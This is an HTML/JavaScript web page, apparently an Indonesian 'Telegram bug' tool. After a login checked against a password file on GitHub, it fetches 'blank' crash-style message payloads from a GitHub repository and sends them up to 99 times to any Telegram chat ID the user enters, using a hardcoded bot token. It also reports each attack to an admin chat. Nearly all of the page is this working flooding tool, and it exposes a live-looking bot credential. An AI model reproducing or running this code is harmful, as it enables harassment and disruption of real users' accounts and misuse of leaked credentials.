<!DOCTYPE html>
<html>
<head>
  <title>Tolls Bug Telegram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #141e30, #243b55);
      color: white;
      padding: 40px;
      text-align: center;
    }

    .box {
      background-color: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 12px;
      max-width: 400px;
      margin: auto;
    }

    input, select, button {
      padding: 10px;
      margin: 10px 0;
      width: 90%;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }

    button {
      background-color: #29b6f6;
      color: white;
      cursor: pointer;
    }

    #dashboard {
      display: none;
    }
  </style>
</head>
<body>
  <div id="login" class="box">
    <h2>🔐 𝙻𝚘𝚐𝚒𝚗...</h2>
    <input type="text" id="username" placeholder="𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎"><br>
    <input type="password" id="password" placeholder="𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍"><br>
    <button onclick="login()">𝙻𝚘𝚐𝚒𝚗</button>
    <p id="loginStatus"></p>
  </div>

  <div id="dashboard" class="box">
    <h2>🕊 𝚃𝚘𝚕𝚕𝚜 𝙱𝚞𝚐 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 🕊</h2>
    <input type="text" id="chatId" placeholder="𝙸𝙳 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 𝚃𝚊𝚛𝚐𝚎𝚝"><br>

    <label>Jumlah Kirim:</label><br>
    <select id="jumlah">
      <script>
        for (let i = 1; i <= 99; i++) {
          document.write(`<option value="${i}">${i}</option>`);
        }
      </script>
    </select><br>

    <button onclick="kirimPesan('pesan')">𝙱𝚕𝚊𝚗𝚔 𝙴𝚊𝚜𝚢</button>
    <button onclick="kirimPesan('pesan1')">𝙱𝚕𝚊𝚗𝚔 𝙼𝚎𝚍𝚒𝚞𝚖</button>
    <button onclick="kirimPesan('pesan2')">𝙱𝚕𝚊𝚗𝚔 𝙷𝚊𝚛𝚍</button>

    <p id="status"></p>
  </div>

  <script>
    const PASSWORDS_URL = "https://raw.githubusercontent.com/justvinzoffc/bug-telegram/main/password.json";
    const BOT_TOKEN = "8213727800:AAGibwkPrsaMArgZmgKNtSKtZMWj1K9C4Jg"; // 🔁 Ganti token bot kamu
    const ADMIN_ID = "6696150439";   // 🔁 Ganti ID admin kamu

    let currentUser = "";

    async function login() {
      const user = document.getElementById("username").value.trim();
      const pass = document.getElementById("password").value.trim();
      const status = document.getElementById("loginStatus");

      if (!user || !pass) {
        status.innerText = "⚠️ Harap isi username & password!";
        return;
      }

      status.innerText = "⏳ Memverifikasi...";

      try {
        const res = await fetch(PASSWORDS_URL);
        const json = await res.json();

        if (json[user] && json[user] === pass) {
          currentUser = user;
          status.innerText = "✅ Login berhasil!";
          document.getElementById("login").style.display = "none";
          document.getElementById("dashboard").style.display = "block";
        } else {
          status.innerText = "❌ Password Tidak Ada di Database";
        }
      } catch (e) {
        status.innerText = "❌ Password Tidak Ada di Database!!";
      }
    }

    async function kirimPesan(pesanFile) {
      const chatIdInput = document.getElementById("chatId").value.trim();
      const jumlah = parseInt(document.getElementById("jumlah").value);
      const status = document.getElementById("status");

      if (!chatIdInput || !jumlah) {
        status.innerText = "⚠️ Harap isi ID dan jumlah kirim!";
        return;
      }

      const urlPesan = `https://raw.githubusercontent.com/justvinzoffc/bug-telegram/main/${pesanFile}.txt`;
      let pesan;
      try {
        const res = await fetch(urlPesan);
        pesan = await res.text();
      } catch (e) {
        status.innerText = "❌ Error Saat Kirim Bug!!";
        return;
      }

      status.innerText = "⏳ Mengirim Bug...";

      let total = 0;
      for (let i = 0; i < jumlah; i++) {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatIdInput,
            text: pesan
          })
        });

        const data = await response.json();
        if (!data.ok) {
          status.innerText = `❌ Gagal kirim: ${data.description}`;
          return;
        }

        total++;
        await new Promise(resolve => setTimeout(resolve, 500)); // jeda 500ms
      }

      status.innerText = `✅ Sukses kirim ${total} Bug ke ${chatIdInput}`;

      // Kirim notifikasi ke ADMIN
      const notif = `🔔 *LOG PENGIRIMAN*\n👤 Pengguna: *${currentUser}*\n🎯 Tujuan: *${chatIdInput}*\n📄 File: *${pesanFile}.txt*\n📦 Jumlah: *${jumlah}x*`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: ADMIN_ID,
          text: notif,
          parse_mode: "Markdown"
        })
      });
    }
  </script>
</body>
</html>
